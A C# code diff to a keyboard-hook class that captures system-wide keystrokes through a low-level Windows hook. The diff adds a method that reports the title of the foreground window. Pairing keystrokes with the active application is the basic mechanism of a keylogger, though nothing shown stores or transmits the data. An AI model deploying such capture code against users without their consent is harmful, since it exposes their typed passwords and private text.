@@ -1,5 +1,6 @@
 ﻿using System;
 using System.Collections.Generic;
+using System.Diagnostics;
 using System.Linq;
 using System.Runtime.InteropServices;
 using System.Text;
@@ -10,6 +11,12 @@ namespace KeyboardHooks
 {
     public static class CoreFunctionImport
     {
+        [DllImport("user32.dll")]
+        public static extern IntPtr GetForegroundWindow();
+
+        [DllImport("user32.dll")]
+        public static extern UInt32 GetWindowThreadProcessId(IntPtr hwnd, ref Int32 pid);
+
         [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
         public static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
 
@@ -32,12 +39,21 @@ namespace KeyboardHooks
 
                 int keyCode = Marshal.ReadInt32(lParam);
                 KeysConverter kc = new KeysConverter();
-
                 string mystring = kc.ConvertToString((Keys)keyCode);
                 CallbackAction(mystring);
 
             }
             return CallNextHookEx(_hookID, nCode, wParam, lParam);
+        }
+
+        public static string GetNameOfApp()
+        {
+            IntPtr h = GetForegroundWindow();
+            int pid = 0;
+            GetWindowThreadProcessId(h, ref pid);
+            Process p = Process.GetProcessById(pid);
+            return p.MainWindowTitle;
+
         }
 
         public const int WH_KEYBOARD_LL = 13;
